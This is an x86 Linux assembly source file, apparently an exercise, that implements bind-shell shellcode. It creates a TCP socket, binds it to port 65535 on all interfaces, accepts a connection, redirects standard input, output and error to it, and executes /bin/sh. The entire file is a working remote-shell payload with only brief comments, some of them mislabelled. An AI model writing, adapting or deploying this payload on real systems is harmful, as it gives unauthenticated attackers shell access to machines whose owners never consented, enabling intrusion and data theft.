; Filename: .nasm
; Author:  
; Website: 	

global _start
    
section .text

CleanRegistersProc:
	xor eax, eax
	xor ebx, ebx
	xor ecx, ecx
	xor edx, edx
	ret

OpenSocket:
    pop edi ;save next instruction after call because we will play with the stack
    
    call 	CleanRegistersProc
    mov al, 102 ; linux syscall socketcall     
	
   ; build the argument array on the stack
    push ebx ; int protocol = 0
    push 1 ; int type = SOCK_STREAM (1)
    push 2 ;int domain = PF_INET (2)
    mov ecx, esp   ;pointer to argument array
	
	mov bl, 01 ; 1 = SYS_SOCKET = socket()
	int 0x80
	
	mov esi, eax
	push edi; store the next instruction after call
	ret
	
BindSocket:

    pop edi ;save next instruction after call because we will play with the stack

    call CleanRegistersProc    
    mov al, 102 ; linux syscall socketcall
 
    ; build sockaddr struct on the stack
    push ebx            ; INADDR_ANY = 0
    push word 0xffff  ; PORT = 65535
    push word 2       ; AF_INET = 2
    mov ecx, esp      ; pointer to sockaddr struct
   	
   	mov bl, 2   ; 2 = SYS_BIND = bind()
   	
   	push BYTE 16      ; sizeof(sockaddr struct) = 16 -> why?
    push ecx          ; sockaddr struct pointer
    push esi          ; socket file descriptor
    mov ecx, esp      ; pointer to argument array
    int 0x80      
    
    push edi
    ret 
    
ListenSocket:

	pop edi ;save next instruction after call because we will play with the stack

    call CleanRegistersProc	
	mov al, 102  ; linux syscall socketcall
	mov bl, 4    ; 4 = SYS_LISTEN = listen()
    
    ; build the Listen() arguments on the stack
    push 1
    push esi     ; socket file descriptor
    mov ecx, esp ; pointer to argument array
    int 0x80      ; kernel interrupt		
	
	push edi
	ret

AcceptSocket:
    pop edi ;save next instruction after call because we will play with the stack
    call CleanRegistersProc
    
    mov al, 102    ; linux syscall socketcall
    mov bl, 5      ; 5 = SYS_ACCEPT = accept()
 
    ; build the accept() arguments on the stack
    push edx                ; socklen = 0
    push edx                ; sockaddr pointer = 0
    push esi                ; socket file descriptor
    mov ecx, esp            ; pointer to argument array
    int 0x80                ; kernel interrupt. eax will hold the connected socket file descriptor
    
    mov esi, eax            ;store the new file descriptor
    push edi
    ret
    
Dup2OutInErr:
    
    pop edi ;save next instruction after call because we will play with the stack
    call CleanRegistersProc
    
    mov al, 63            ; linux syscall dup2
    mov ebx, esi
    xor ecx, ecx            ; duplicate stdin
    int 0x80 
    
    call CleanRegistersProc
    mov al, 63            ; linux syscall dup2
    mov ebx, esi
    inc ecx                    ; duplicate stdout, ebx still holds the socket fd
    int 0x80  
    
    call CleanRegistersProc
    mov al, 63            ; linux syscall dup2
    mov ebx, esi
    inc ecx
    inc ecx               ; duplicate stdout, ebx still holds the socket fd
    int 0x80  
    
    push edi
    ret

ExecuteBinSh:
    pop edi ;save next instruction after call because we will play with the stack
    
    call CleanRegistersProc
    mov al, 11              ; linux syscall execve
    mov ebx, edi     ; pointer to the programm that should get executed
    push ecx                ; push ecx to the stack
    mov ecx, esp            ; pointer for argv
    mov edx, esp            ; pointer for envp
    int 0x80                ; kernel interrupt
    
    push edi
    ret

call_shellcode :
    call OpenSocket     
    call BindSocket
    call ListenSocket
    call AcceptSocket
    call Dup2OutInErr
    call ExecuteBinSh	
	bashstring: db "/bin/sh", 0x0 ; path to the programm we want to execute
_start:
   jmp short call_shellcode 
